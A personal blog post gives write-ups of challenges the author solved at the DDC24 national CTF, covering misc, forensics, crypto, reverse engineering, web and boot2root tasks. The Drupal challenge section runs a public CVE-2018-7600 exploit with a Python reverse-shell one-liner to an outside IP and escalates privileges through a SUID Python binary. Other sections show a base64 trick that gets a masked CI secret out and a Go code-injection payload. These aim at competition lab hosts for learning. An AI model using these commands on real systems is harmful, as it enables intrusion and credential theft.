---
title: 'DDC24 - National Writeups'
description: 'Writeups of all challenges I solved during nationals of DDC24'
pubDate: 'May 5 2024'
heroImage: '/DDC_National24.png'
tags: ['CTF', 'DDC', 'Web', 'Forensics', 'B2R', 'Misc', 'Crypto', 'Rev']
---

The national championship of DDC was held on May 4, 2024, and I ended up placing number 8 in the junior category.
![National Scoreboard](/src/assets/DDC24National/ScoreboardNationals.png) 

# Challenges

## Misc
### Hi Grandma
###### 100pts - 35 solves - Easy
The goal of this challenge is to get some specific information out of a ``docx`` file. The descriptions hint to using the Python library ``docx``.
To solve this, we need the following:
* Time last modified
* Name of who modified it last
* Amount of times modified

These can be achieved through the following core document properties using the ``docx`` library:
* ``doc.core_properties.modified``
* ``doc.core_properties.last_modified_by``
* ``doc.core_properties.revision``

Where ``doc = Document("Hi_Grandma.docx")``.
For convenience, I have created a solve-script to output the flag in the correct format:
```py
from docx import Document

doc = Document("Hi_Grandma.docx")

# When was the doc last modified
time = str(doc.core_properties.modified.hour) + str(doc.core_properties.modified.minute)
# Who modified it last
name = doc.core_properties.last_modified_by.replace(' ','_')
# How many times has it been modified
changes = doc.core_properties.revision

print(f"DDC{{{time}_{name}_{changes}}}")
```

And from running that we get the flag! ``DDC{1544_Thomas_Jefferson_3}``

### Birthday Boy
###### 100pts - 30 solves - Very Easy
For this challenge, we are given a voice recording of someone during a phone call. Our goal is to figure out his CPR number, which he is asked to give during the call. Listening to the audio, we can hear him tapping the number on the phone keypad. 
From this information, we can figure out that it is a DTMF decoding challenge.

To solve this, simply cut out everything from the audio file except the part with the keypad presses and upload it to something like [dtmf.netlify.app](https://dtmf.netlify.app/).
After uploading it here and decreasing the sensitivity threshold to ``0.01``, we have the following number:
``0405994209`` which is our flag!

``DDC{0405994209}``


### NestedQuizz
###### 116pts - 19 solves - Easy
The goal of this challenge is to obtain the passwords of several ``.rar`` files using each given file. We are also informed that the starting letter of each password is capitalised.

We are first met with two files:
* ``Level1.rar``
* ``JKVhwx.igz``

In order to find the password we can run ``file`` on the unknown file using ``file JKVhwx.igz`` which results in:
> ``JKVhwx.igz: PNG image data, 1015 x 1015, 8-bit/color RGBA, non-interlaced``

To see the image, we can rename it with the appropriate file extension:
``cp JKVhwx.igz pass1.png``

Opening this image, we are met with a QR code, which, when decrypted, gives us the question for the first password:
> ``After what Greek island is the earliest analog computer named after?``

After googling this question, the answer turns out to be the ``Antikythera Mechanism`` therefore making the first password ``Antikythera``.

Once extracted with the password, we are given two new files:
* ``Level2``
* ``FhklxVhwx.pto``

After running file on the new unknown file, it turns out to be an audio file containing Morse Code.

This can be decoded manually or using one of many online tools. Once decoded we get the message:
> ``Who invented the information bit?``

This can also be Googled and turns out to be ``Claude Shannon``, therefore making the second password ``Shannon``.

This gives us the final part of the challenge:
* ``Level3``
* ``Zalnhuvnyhwof.wun``

This is also an image, but it does not have anything interesting to be found in the image itself.
Instead, running ``zsteg`` on the image gives us the next question: 
> ``Which country first broke Enigma?``

Which turns out to be ``Poland``!

Now it's possible to extract the contents of ``Level3.rar``, which reveals a file called ``Mshn.aea`` that holds the flag!

``DDC{Phr0m_Th3_80770m_70_Th3_70p}``


## Boot2Root
### Poursoft 1
###### 116pts - 19 solves - Very Easy
This challenge series contains a Gittea instance as well as a Drone instance.

To find the first flag we can simply look around the Gittea instance on ``git.poursoft.hkn``.

Here it is possible to browse various repositories, one of which contains the flag, and the needed credentials to proceed.

By going to [https://git.poursoft.hkn/p.smith/scripts/commit/0a920b4c121728e315a02393b523526422fdc9f7](https://git.poursoft.hkn/p.smith/scripts/commit/0a920b4c121728e315a02393b523526422fdc9f7) the user ``p.smith`` has exposed their login credentials along with the first flag in base64.

After running ``echo "RERDe3RoMHNlX3Azc2t5X3B1YmwxY19naXRfcjNwMHNfMG5fczNsZmgwc3RlZH0=" | base64 -d `` we get the flag!

``DDC{th0se_p3sky_publ1c_git_r3p0s_0n_s3lfh0sted}``


### Poursoft 2
###### 484pts - 9 solves - Medium - Solved after competition
By using the newly acquired credentials, we can login to ``drone.poursoft.hkn``.

From here, we can see two repositories. And by looking at the git instance, it turns out we can push changes to the ``m.miller/website-docker-test`` repository.
By inspecting the ``.drone.yml``, it turns out that it runs ``echo $SECRET_VALUE`` on startup. By simply pushing the file again with no impactful change, we can see that it returns the value:
> ``******``

From here, the challenge is to figure out a way to get the secret value without displaying it in cleartext, as that gets censored.

This can be done by changing the ``echo $SECRET_VALUE`` command to ``echo $SECRET_VALUE | base64``.

After pushing this change, the setup now returns the flag in base64:
> ``RERDe1dhMXRfczNjcjN0c180cjNfbjB0X3MzY3IzdH0K``

Now we can do ``echo "RERDe1dhMXRfczNjcjN0c180cjNfbjB0X3MzY3IzdH0K" | base64 -d``, and we get the flag!

``DDC{Wa1t_s3cr3ts_4r3_n0t_s3cr3t}``


### Straight drip marketplace
###### 484pts - 9 solves - Medium

Upon visiting the site, we are greeted with a Drupal login page. From here, we can find the Drupal version by going to [http://straight-drip.hkn/CHANGELOG.txt](http://straight-drip.hkn/CHANGELOG.txt).

From the changelog, it turns out that the server is running ``Drupal 7.57`` which, after a quick Google search, turns out to be vulnerable against ``CVE-2018-7600``.
A public PoC of this CVE can be found at [https://github.com/pimps/CVE-2018-7600](https://github.com/pimps/CVE-2018-7600)

This allows us to get RCE!

To do so, we can open a Netcat listener and execute:


``python3 drupa7-CVE-2018-7600.py http://straight-drip.hkn -c "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"77.96.98.4\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"``

This spawns us a shell as ``www-data``.

To become root, we can start by looking for SUID binaries with the following command:

``find / -uid 0 -perm -4000 -type f 2>/dev/null``

This returns ``/usr/bin/python2.7``, which is very interesting for escalating our privileges. This can be done by spawning a shell from Python with the following command:

``python -c 'import os; os.execl("/bin/sh", "sh")'``

From here, we just need to read the flag at ``/root/very_secret_information_how_did_you_find_this.txt``, and we get the flag!

``DDC{Y0U_F0UND_M3_N0W_S4V3_M3}``

## Crypto
### Hashmaster 101
###### 100pts - 38 solves - Very Easy
In this, we are given a script and a text file with the MD5 hash of each character in the flag. 
To solve this, we can just take the alphabet list from the provided script and generate an MD5 hash of each character to figure out the flag.

```py
from Crypto.Hash import MD5

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_"

lookupTable = {}
for char in alphabet:
    md5 = MD5.new()
    md5.update(char.encode())
    hashedChar = md5.hexdigest()
    lookupTable[hashedChar] = char

hashes = []
with open('output.txt', 'r') as file:
    for line in file:
        hash = line.split(' = ')[1].strip()
        hashes.append(hash)

print(''.join(lookupTable[hash] for hash in hashes))
```

This works by making a "lookup table" with each character and its hashed value. Then it goes through each MD5 hash from the output file and returns the corresponding character.
After running the script, we get the flag!

``DDC{one_way_doesnt_matter_if_you_brute_input_space}``

## Forensics
### Where are my files
###### 100pts - 39 solves - Easy
For this challenge, we are given a folder with a file named ``Praktikant.rtf`` and a hidden folder named ``.PraktikanHR``.
The challenge here is to know how to see and access hidden folders.

Within the hidden folder, there is a file ``Praktikant.pdf``, which contains the following:
> Navn: Anders Kristensen <br>
> Brugernavn: Ankr <br>
> Kodeord: Forensics123

This information is all we need for the flag!

``DDC{Kristensen_Ankr_Forensics123}``


### Link is broken
###### 100pts - 43 solves - Very Easy
In this challenge, we are given an image ``Catsstego.jpg`` and a text file ``URL.txt``.

There are two ways of solving this.
To start, we can read the contents of the text file which returns:
> ``aHR0cHM6Ly9mdXR1cmVib3kudXMvc3RlZ2Fuby9kZWNpbnB1dC5odG1s``

Which is base64 and gives [https://futureboy.us/stegano/decinput.html](https://futureboy.us/stegano/decinput.html).

On this website, the cat image can be uploaded, and we get the flag text ``Winter_is_over``.

A faster way of solving this is to run ``steghide extract -sf Catssteg.jpeg`` and give an empty password. This extracts a file named ``steganopayload1183784.txt``, which contains the flag text ``Winter_is_over``.

``DDC{Winter_is_over}``


### I spy with my little I 1
###### 557pts - 8 solves - Hard
Here we are given an iOS dump and tasked with finding some specific information. We are informed that the flag format is ``DDC{suspiciousmailservice-downloadedfilename-owneremail-foreignphonenumber}``, and we get the hashes of each piece of information to double check:
> Mailservice: 9de52318934d6f01dac3bf8392c3c4bc <br>
> Filename: 55ca2f75addd806653d86d87dbfb49d0 <br>
> Owner mail: ab8edbf8e56b662cfc91e0785fb28ea6 <br>
> Phone: bc1869b7ca69edc007fc76a52c848c21

To start analysing this, we can use [ILEAPP](https://github.com/abrignoni/iLEAPP).
Once the report is done generating, we can start analysing. 

By going to ``Safari Browser - History``, we can see a link to ``mail.ru``, which is the mail service we need!
After some formatting, it turns out that ``echo -n "mail_ru" | md5sum`` gives the hash we need! So the first part of the flag is ``mail_ru``.

We can find the second part of the flag in the ``Files App`` section under the ``Files stored in iCloud Drive`` section. This gives us the file ``AmazonAtlas_v1``, which also has a matching hash.

The email can be found in ``Account Data`` and turns out to be ``ole-hansen0101`` after formatting.

Now we only need the foreign phone number, which can be found in the ``Address Book``. After formatting, we get ``8015467661``.

All that is left to do is to fit it into the flag format!


``DDC{mail_ru-AmazonAtlas_v1-ole-hansen0101-8015467661}``

### I spy with my little I 2
###### 633pts - 7 solves - Hard
The second part of the challenge is about finding and gaining access to the messages within the Signal database.
However, it is possible to solve this challenge simply by using ``grep``.

``grep -r "DDC{"``

After running for a while, we get the flag from the pasteboard at ``private/var/mobile/Library/Caches/com.apple.Pasteboard/eb77e5f8f043896faf63b5041f0fbd121db984dd/5f721d312c5a452688bef03c17f734723b190359``!


``DDC{iOS_f0r3ns1cs_1s_quit3_co0l}``

### Braindagram
###### 1000pts - 1 solve - Hard - First Blood!
This challenge is an OSINT challenge combined with some stenography.

To start off, we are given the username ``@brainthedooog`` and the flag format ``DDC{Abcde_Abcdefghi_Abcdefghij_Ab}`` as well as being tasked with finding the full name of Brian's dad.

Judging from the name of the challenge, Instagram is a good place to start looking, and sure enough, a profile matches [https://www.instagram.com/brainthedooog/](https://www.instagram.com/brainthedooog/)!

From here, he talks a lot about his dad being his biggest inspiration.

By going through his 'following' list, we can find Peter's account [https://www.instagram.com/peter_the_top.g/](https://www.instagram.com/peter_the_top.g/).

On this account, a certain post stands out a bit more than the rest. [https://www.instagram.com/p/C3kQuvwMA1I/](https://www.instagram.com/p/C3kQuvwMA1I/) mentions ``TAG`` and something about a secret website.
Looking at the tags ``#Flicker`` and ``#DeDanskeCybermesterskaber``, it seems that the next piece of the challenge is located on Flickr!

Luckily, it is possible to search by tags on Flickr [https://www.flickr.com/search/?tags=dedanskecybermesterskaber&view_all=1](https://www.flickr.com/search/?tags=dedanskecybermesterskaber&view_all=1). This shows a handful of images posted by an account named ``Found me`` ([https://www.flickr.com/photos/200125421@N02/](https://www.flickr.com/photos/200125421@N02/)).


At first glance, the image with the car and the image with the phone seem quite out of place. By looking at the image of the car, it has an interesting description:
> ``look at this RARe color. loving it..``

The capitalization here hints towards the image containing a file of some kind. And sure enough, it contains a file named ``flag.docx`` by running ``steghide extract -sf car.jpg`` with a blank password.

To get the flag part from the flag file, we can unzip the ``docx`` file to get the document properties. After having done this, one part of the flag can be found in ``docProps/core.xml``!
> ``DDC{....._L0wenbr4u_........._.........._..}``

Going back to the other images, we still have the phone image left that stands out.
Running ``exiftool phone.png`` will reveal another part of the flag in the author field!
> ``DDC{....._........._4777999333333444663666777_..}``

But this looks a bit odd and does not follow the flag format. Judging from the image of the phone, it seems to be some sort of multitap cipher! To quickly decode this, we can use a tool like [https://www.dcode.fr/multitap-abc-cipher](https://www.dcode.fr/multitap-abc-cipher).

After decoding, we get ``GRYFFINDOR``, which seems to follow the flag format once properly formatted:
> ``DDC{....._........._Gryffindor_..}``


But we are still missing half of the flag, so let's go back and look at the images again.
There's a lot of different references and strings hidden in most of the images, but the last interesting image turns out to be the "DO NOT TOUCH BUTTON" image.

This seems to be a reference to pressing the ``Show Exif`` button on Flicker, which reveals the last part of the flag in the author field:
> ``DDC{....._........._.........__Sr}``


By collecting the pieces of the flag we currently have, we are left with:
> ``DDC{....._L0wenbr4u_Gryffindor_Sr}``

After looking through the remaining images, I was unable to find the first part of the flag and simply decided to try to guess just from the fact that it was Peter from Family Guy.

And on the first attempt, the flag was guessed and turned out to be:


``DDC{Peter_L0wenbr4u_Gryffindor_Sr}``


## Rev
### The Gauntlet 1
###### 906pts - 3 solves - Easy
This challenge was based on knowing how to reverse engineer an ``exe`` file.
When the program is run, we are asked which way we want to go. One option makes the program exit, and the other asks us to enter a code.

To figure out the code, we can load it into ILSpy and see what it is checking for.

The first thing to notice is the direction check:
```c#
if (text == "L")
{
	Console.WriteLine("You chose to go left.");
	Console.WriteLine("After an walking for an undefined amount of time you succumb to thirst and die.");
	Environment.Exit(1);
}
```

From this, we can figure out that our first input has to be ``R``.

Further down, we can find the code checking the code we input:
```c#
Console.WriteLine("The combination is a 6-digit number. Enter your guess:");
string text2 = Console.ReadLine();
if (SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(text2)).SequenceEqual(new byte[32]
{
	208, 103, 239, 40, 180, 18, 157, 92, 134, 187,
	183, 22, 182, 157, 211, 40, 110, 216, 161, 239,
	47, 133, 117, 26, 91, 114, 119, 104, 140, 206,
	233, 25
    }))
```

This checks the SHA256 hash of our input against a hardcoded hash. Knowing this is a 6-digit code, we should be able to find the correct input from the hash by searching online.

In order to get the hash, we can take the number sequence and put it into [CyberChef](https://gchq.github.io/CyberChef/). From here, we convert it from Decimal to Hex with no delimiter. For ease, the CyberChef recipe can be found [here](https://gchq.github.io/CyberChef/#recipe=From_Decimal('Space',false)To_Hex('None',0)&input=MjA4LCAxMDMsIDIzOSwgNDAsIDE4MCwgMTgsIDE1NywgOTIsIDEzNCwgMTg3LCAxODMsIDIyLCAxODIsIDE1NywgMjExLCA0MCwgMTEwLCAyMTYsIDE2MSwgMjM5LCA0NywgMTMzLCAxMTcsIDI2LCA5MSwgMTE0LCAxMTksIDEwNCwgMTQwLCAyMDYsIDIzMywgMjU&oeol=NEL). This gives us the hash:
> ``d067ef28b4129d5c86bbb716b69dd3286ed8a1ef2f85751a5b7277688ccee919``

By putting this into something like [https://crackstation.net/](https://crackstation.net/), we can find the needed code:
> ``412571``


By digging further into the code, there are more checks we have to pass.
The next check checks if our input equals the solution to a maze:
```c#
if (Console.ReadLine() != "WAWWDDDSDDWWWAWWAAW")
{
	Console.WriteLine("You step on the wrong pressure plate and the chamber collapses around you.");
	Console.WriteLine("You are trapped forever and never see the light of day again.");
	Environment.Exit(1);
}
```

This just means that our next input has to be ``WAWWDDDSDDWWWAWWAAW``.

And finally, we are on the final check:
```c#
Console.WriteLine("Here is the riddle:");
Console.WriteLine("I speak without a mouth and hear without ears. I have no body, but I come alive with the wind. What am I?");
Console.WriteLine("Enter your answer:");
string text3 = Console.ReadLine();
if (text3 == "echo")
{
	Console.WriteLine("The floor beneath you opens up and you fall into a pit of darkness.");
	Console.WriteLine("In the time you fall through the darkness you wonder who would be stupid enough to provide potentiel thiefs with a hint to the secret key?...");
	Console.WriteLine("You hit the bottom and die.");
	Environment.Exit(1);
}
string name = Assembly.GetExecutingAssembly().GetManifestResourceNames()[0];
using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
MemoryStream memoryStream = new MemoryStream();
stream.CopyTo(memoryStream);
byte[] bytes = Encoding.ASCII.GetBytes(text3);
byte[] array = memoryStream.ToArray();
ICryptoTransform transform = new DESCryptoServiceProvider().CreateEncryptor(array, array);
CryptoStreamMode mode = CryptoStreamMode.Write;
MemoryStream memoryStream2 = new MemoryStream();
CryptoStream cryptoStream = new CryptoStream(memoryStream2, transform, mode);
cryptoStream.Write(bytes, 0, bytes.Length);
cryptoStream.FlushFinalBlock();
byte[] array2 = new byte[memoryStream2.Length];
memoryStream2.Position = 0L;
memoryStream2.Read(array2, 0, array2.Length);
if (Convert.ToBase64String(array2) != "Esq+tnXWE6lraraaDbCTxZkOpsbH0uCX9Mo8M48BZjI=")
{
	Console.WriteLine("The barrier remains in place and you are unable to claim the sword.");
	Console.WriteLine("You are trapped in the chamber forever and never see the light of day again.");
	Environment.Exit(1);
}
```

This may seem a bit confusing at first. The programs asks us a riddle to which the answer would be ``echo``, but the program exits if we give that input, so we have to figure out how the encryption works.

The most notable piece of code from the encryption is:

``string name = Assembly.GetExecutingAssembly().GetManifestResourceNames()[0];``

This resource is used as both the key and IV, so finding that will allow us to decrypt the string!

This resource can be found by going into ILSpy and going to ``Resources``. This will show the resource ``level_1.Resources.key``. From here, we can press the "save" button and save it somewhere. From here, we can run ``xxd level_1.Resources.key`` to get the hex of the key:
> ``8923544742911336``

Now we have all the pieces needed to decrypt the string. This can be done using CyberChef again. We take the base64 string and decode it from base64 in CyberChef and feed that into the DES decrypt function with ``8923544742911336`` as the IV and KEY in hex. For ease, the recipe can be found [here](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)DES_Decrypt(%7B'option':'Hex','string':'2389475491423613'%7D,%7B'option':'Hex','string':'2389475491423613'%7D,'CBC','Raw','Raw')&input=RXNxK3RuWFdFNmxyYXJhYURiQ1R4WmtPcHNiSDB1Q1g5TW84TTQ4QlpqST0). This gives us the password we need:
> ``d0tnet_1s_r34lly_34sy_t0_r3v``


Now we have all the pieces needed to get the flag!

``DDC{d0tnet_1s_r34lly_34sy_t0_r3v_412571}``


## Web
### Your loss my win
###### 100pts - 24 solves - Very Easy - First Blood!
By visiting the page on ``league.hkn``, we are met with a scoreboard and the goal of making the lowest-ranking player the highest-ranking.

By going to ``league.hkn/account``, we can download the latest game as well as upload new games. Downloading the latest game contains the following information:
> Name: RavenFrost <br>
> Opponent: InfernoSpecter <br>
> Result: Win <br>
> Game ID: RIW47

There are a few notable things in this file:
* The game is from the perspective of one of the top-ranking users
* The game was against the lowest-ranking user.
* The Game ID consists of the first letter of the ``Name``, the first letter of the ``Opponent`` as well as the ``result`` and an ID.

To solve this, we have to "fake" a game log that would result in ``InfernoSpecter`` gaining points.
This can be done with the following changes to the file:
> Name: RavenFrost <br>
> Opponent: InfernoSpecter <br>
> Result: Loss <br>
> Game ID: RIL48

This tells the server that ``RavenFrost`` lost the game and that ``InfernoSpecter`` should be getting points instead. By submitting this file a couple of times, we are greeted with the flag on the scoreboard page!

``DDC{Ch3471n9_Ru1n5_G4m3s}``

### Go Calculator
###### 107pts - 20 solves - Very Easy
On this website, we are greeted with an input box to give input to the following Go program:
```go
package main

import "fmt"

const TOKEN = "DDC{...}" // API token used to connect to the API

func main() {
    fmt.Print(float64(/* input */))
}
```

By giving the website an input like ``1+1``, we can see that it returns ``2``. To solve this, we have to inject another print statement.

We can do this with the following input:

``1)); fmt.Print(TOKEN) //``

This closes the first print and float call and prints the token.

After being injected, the main code would look like this:

``fmt.Print(float64(1)); fmt.Print(TOKEN) //``

And that gives us the flag!

``DDC{g0_n07_g014ng}``